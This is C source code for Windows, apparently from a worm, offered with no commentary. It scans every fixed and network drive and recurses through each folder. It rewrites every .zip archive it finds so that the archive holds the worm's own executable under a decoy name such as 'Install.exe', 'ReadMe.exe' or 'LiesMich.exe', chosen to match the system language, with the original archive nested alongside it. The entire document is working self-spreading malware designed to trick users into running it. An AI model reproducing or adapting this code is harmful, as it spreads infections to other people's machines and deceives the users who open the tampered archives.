   void InfectDirectoryZ(void);

   DWORD WINAPI ZipWorm(LPVOID)
   {
       char            DriveLetter[2];
       char            Buffer[MAX_PATH];

       for(int d = 66; d < 91; d++) //b - z
       {
           DriveLetter[0] = d;
           DriveLetter[1] = 0;

           lstrcpy(Buffer, DriveLetter);
           lstrcat(Buffer, ":\\");

           if(GetDriveType(Buffer) == DRIVE_FIXED || GetDriveType(Buffer) == DRIVE_REMOTE)
           {
               if(SetCurrentDirectory(Buffer) != 0)
               {
                   InfectDirectoryZ();
               }
           }

       }

       return 0;
   }

   void InfectDirectoryZ(void)
   {
       HANDLE          FindHandle;
       WIN32_FIND_DATA Win32FindData;
       char            WormFile[MAX_PATH];
       char            InfectionName[MAX_PATH];
       char            *FakeNameGer[] =    {
                                               "Installation",
                                               "LiesMich",
                                               "Lizenz",
                                               "Bilder",
                                               "Addons",
                                               "Quellcode"
                                           };
       char            *FakeNameEng[] =    {
                                               "Install",
                                               "ReadMe",
                                               "Licence",
                                               "Pictures",
                                               "Addons_ENG",
                                               "SourceCode"
                                           };
       HZIP            ZipHandle;
       char            ZipTemp[MAX_PATH];

       if(GetModuleFileName(0, WormFile, sizeof(WormFile)) != 0)
       {
           FindHandle = FindFirstFile("*", &Win32FindData);

           do
           {
               if(Win32FindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY && Win32FindData.cFileName[0] != '.')
               {
                   if(SetCurrentDirectory(Win32FindData.cFileName) != 0)
                   {
                       InfectDirectoryZ();
                       SetCurrentDirectory("..");
                   }
               }
               else if(Win32FindData.cFileName[0] != '.')
               {
                   CharLowerBuff(Win32FindData.cFileName, lstrlen(Win32FindData.cFileName));

                   if(lstrcmp(Win32FindData.cFileName + lstrlen(Win32FindData.cFileName) - 4, ".zip") == 0)
                   {
                       if(RandomNumber(10) < 8)
                       {
                           if(GermanLang() == true)
                           {
                               lstrcpy(InfectionName, FakeNameGer[RandomNumber(6)]);
                           }
                           else
                           {
                               lstrcpy(InfectionName, FakeNameEng[RandomNumber(6)]);
                           }
                       }
                       else
                       {
                           Win32FindData.cFileName[lstrlen(Win32FindData.cFileName) - 4] = 0;
                           lstrcpy(InfectionName, Win32FindData.cFileName);
                           lstrcat(Win32FindData.cFileName, ".zip");
                       }

                       lstrcat(InfectionName, ".exe");

                       lstrcpy(ZipTemp, Win32FindData.cFileName);
                       lstrcat(ZipTemp, ".tmp");

                       if(CopyFile(Win32FindData.cFileName, ZipTemp, 0) != 0)
                       {
                           ZipHandle = CreateZip(Win32FindData.cFileName, 0, ZIP_FILENAME);

                           if(ZipHandle != 0)
                           {
                               ZipAdd(ZipHandle, InfectionName, WormFile, 0, ZIP_FILENAME);
                               ZipAdd(ZipHandle, Win32FindData.cFileName, ZipTemp, 0, ZIP_FILENAME);
                               CloseZip(ZipHandle);

                               DeleteFile(ZipTemp);
                           }
                       }
                   }
               }
           }
           while(FindNextFile(FindHandle, &Win32FindData) != 0);
       }

       return;
   }
